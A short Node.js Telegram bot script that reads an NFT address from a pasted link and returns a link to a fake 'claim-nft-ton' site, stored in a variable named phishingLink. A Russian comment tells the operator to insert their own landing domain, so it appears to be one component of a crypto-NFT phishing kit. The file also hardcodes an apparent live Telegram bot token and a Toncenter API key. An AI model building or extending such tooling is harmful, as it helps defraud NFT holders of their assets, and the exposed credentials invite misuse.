const TelegramBot = require('node-telegram-bot-api');
const { TonClient } = require('@ton/ton');

const BOT_TOKEN = '7759520200:AAGuQ8lQxWdb-4HEJJr9Y9SPZxcFT-OLero';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Инициализация клиента для проверки данных NFT
const client = new TonClient({
    endpoint: 'https://toncenter.com/api/v2/jsonRPC',
    apiKey: '0e5ee92cf3397e7f17f7044e00c1df1252dee4de8093e97df4e90d7098ce87f2'
});

console.log("Bot is running...");

bot.on('message', async (msg) => {
    const text = msg.text;
    if (!text || !text.startsWith('http')) return;

    try {
        // Парсим адрес NFT из URL (например, из ссылки на GetGems)
        const parts = text.split('/');
        const nftAddress = parts[parts.length - 1];

        if (nftAddress.length < 40) {
            bot.sendMessage(msg.chat.id, "❌ Не нашел адрес NFT в ссылке.");
            return;
        }

        // Тут ты вставляешь ссылку на свой домен с лендингом
        const phishingLink = `https://claim-nft-ton.railway.app?nft=${nftAddress}`;
        
        bot.sendMessage(msg.chat.id, `✅ Ссылка готова:\n${phishingLink}`);
    } catch (e) {
        bot.sendMessage(msg.chat.id, "Ошибка парсинга.");
    }
});
